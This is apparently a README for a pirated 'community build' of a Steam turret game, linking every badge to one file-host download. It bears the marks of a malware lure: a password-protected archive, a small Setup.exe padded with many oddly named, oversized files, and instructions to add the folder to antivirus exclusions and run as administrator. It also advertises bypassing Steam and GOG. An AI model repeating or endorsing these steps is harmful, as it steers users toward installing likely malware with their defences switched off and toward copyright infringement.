<div align="center">

# 🎮 IRON NEST: Heavy Turret Simulator — Community Edition

**Command heavy turrets. Defend the nest. Simulated.**

[![Status](https://img.shields.io/badge/status-stable-success?style=flat-square)](https://gofile.io/d/kLmM81np)
[![Download](https://img.shields.io/badge/download-available-brightgreen?style=flat-square)](https://gofile.io/d/kLmM81np)
[![Platform](https://img.shields.io/badge/platform-Windows-0078D6?style=flat-square&logo=windows)](https://gofile.io/d/kLmM81np)
[![Version](https://img.shields.io/badge/version-1.0-blue?style=flat-square)](https://gofile.io/d/kLmM81np)

[Download](#-installation--setup) · [About](#-about-the-game)

</div>

---

## 📜 Table of Contents

1. [About the Game](#-about-the-game)
2. [Screenshots](#-screenshots)
3. [What You Get](#-what-you-get)
4. [System Requirements](#-system-requirements)
5. [Download & Installation](#-installation--setup)
6. [Troubleshooting](#-troubleshooting)

---

## 🎮 About the Game

IRON NEST: Heavy Turret Simulator is a tactical turret simulation game focused on heavy weapon systems, ballistic physics, and defensive combat scenarios. Players take control of stationary heavy turrets across a range of environments, managing targeting, ammunition, and heat management while repelling waves of ground and air threats. This Community Edition is a standalone build packaged as a self-contained release, requiring no storefront or additional software to run.

This build is for players who enjoy tactical simulation and stationary-defense gameplay on Windows PCs.

> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.

## 📸 Screenshots

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2950790/bc45f4257b9eab076a0688009406d84c7607e547/ss_bc45f4257b9eab076a0688009406d84c7607e547.1920x1080.jpg?t=1787498698" alt="Screenshot 1" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2950790/9cc17a0ae638e8da7e65d461191c6fda9d14a3a0/ss_9cc17a0ae638e8da7e65d461191c6fda9d14a3a0.1920x1080.jpg?t=1787498698" alt="Screenshot 2" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2950790/584ae4d54b0d5d377b7b3518c8c399d6c8e3eda8/ss_584ae4d54b0d5d377b7b3518c8c399d6c8e3eda8.1920x1080.jpg?t=1787498698" alt="Screenshot 3" width="100%"></td>
 </tr>
</table>



---

## 🔓 What You Get

- ✅ **No Steam / GOG account required**
- ✅ **No online activation** — works fully offline
- ✅ **Includes all available content**
- ✅ **No launcher bloat** — launch directly from the.exe
- ✅ **Multiplayer support** — LAN and direct P2P connection supported

---

## 📋 Build Details

| Field | Detail |
|---|---|
| **Build Type** | Community Build |
| **Status** | stable |
| **Activation** | Not required — ready to play |
| **Multiplayer** | LAN and direct P2P connection supported |
| **Compatibility** | Windows 10/11 |

---

## 🌍 Languages

- **Interface:** English, German, French, Russian, Spanish
- **Voiceover:** English

---

## 📦 Package Features

- 🎯 **Realistic Ballistics** — Projectile drop, travel time, and penetration modeled on simplified physics rules.
- 🌡️ **Heat & Barrel Management** — Sustained fire causes barrel heat buildup, forcing controlled trigger discipline.
- 🛡️ **Wave Defense Scenarios** — Hold positions against escalating waves of infantry, vehicles, and aircraft.
- 🔧 **Turret Loadout Customization** — Swap barrels, optics, and ammunition types between missions.
- 🗺️ **Multiple Combat Zones** — Desert, industrial, arctic, and urban maps with distinct sightlines and threats.
- 🎮 **First-Person Turret Control** — Manual aim and fire from the gunner seat with full camera freedom.
- 📊 **Mission Statistics** — Track accuracy, targets destroyed, ammunition spent, and survival time.
- ⚙️ **Difficulty Settings** — Adjust threat intensity, resupply frequency, and assist options.
- 💾 **Offline Progress Saving** — Campaign progress and unlockables saved locally, playable fully offline.
- 🔊 **Detailed Audio Design** — Layered weapon sounds, shell casings, and ambient battlefield effects.
- 🕹️ **Gamepad Support** — Full controller bindings alongside keyboard and mouse input.

- **Compression:** Lossless
- **Install Time:** ~3 minutes on SSD, ~8 minutes on HDD
- **Recoding:** none
- **Selective Download:** Not applicable — single self-contained package

---

## 📦 DLCs Included

- Ammo Expansion Pack
- Arctic Outpost Map

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| **OS** | Windows 10 64-bit | Windows 10/11 64-bit |
| **Processor** | Intel Core i5-4460 / AMD FX-8300 | Intel Core i5-9400 / AMD Ryzen 5 3600 |
| **RAM** | 8 GB | 16 GB |
| **Graphics** | NVIDIA GTX 960 / AMD Radeon R9 280X, 4 GB VRAM | NVIDIA GTX 1660 / AMD RX 5600 XT, 6 GB VRAM |
| **Storage** | 12 GB available space | 12 GB available space on SSD |
| **Additional** | DirectX 11 compatible sound card | SSD and headphone audio output recommended |


---

## 📥 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the link below:
- **Download Link:** [https://gofile.io/d/kLmM81np](https://gofile.io/d/kLmM81np)

### Step 2: Extract

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable (6.3 MB)
|-- scripts.lic <- Game scripts (53.6 MB)
|-- patch_1.bnk <- Audio banks (34.5 MB)
|-- res.pak <- Resources archive (10.2 MB)
|-- animations.dll <- Animation system (4.7 MB)
|-- update_1.res <- Update resources (4.5 MB)
|-- api.pak <- API modules (4.3 MB)
|-- settings.bin <- Configuration (4.2 MB)
|-- license.wem <- Audio assets (3.8 MB)
|-- global.cfg <- Global settings (3.7 MB)
|-- assets.wem <- Asset audio (3.6 MB)
|-- physics.sys <- Physics engine (3.2 MB)
|-- dlc.md5 <- DLC checksums (3.2 MB)
|-- launcher.dll <- Launcher library (3.1 MB)
|-- driver.umap <- Driver data (2.7 MB)
|-- installer.dat <- Installer data (2.2 MB)
|-- license.bank <- License data (2.0 MB)
|-- update_1.ini <- Update config (1.9 MB)
|-- driver.pak <- Driver archive (1.6 MB)
|-- localization.ini <- Language files (1.5 MB)
|-- uninstall.key <- Uninstall key (1.1 MB)
|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
|-- lang.sys <- Language system (0.8 MB)
|-- audio.res <- Audio resources (1 KB)
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the community build.
3. Enjoy the full experience!

> 💡 **Saves location:** `%LOCALAPPDATA%\IRONNEST:HeavyTurretSimulator\Saved`

---

## 🐛 Troubleshooting

- **Antivirus false positive:** Add the game folder to exclusions.
- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
- **Multiplayer not working:** Make sure all players use the same build version and connect via LAN or the same P2P lobby.

---

<div align="center">

**If this build worked for you, leave a ⭐ to help others find it.**

<sub>Built with caffeine. Not responsible for melted GPUs or broken saves.</sub>

</div>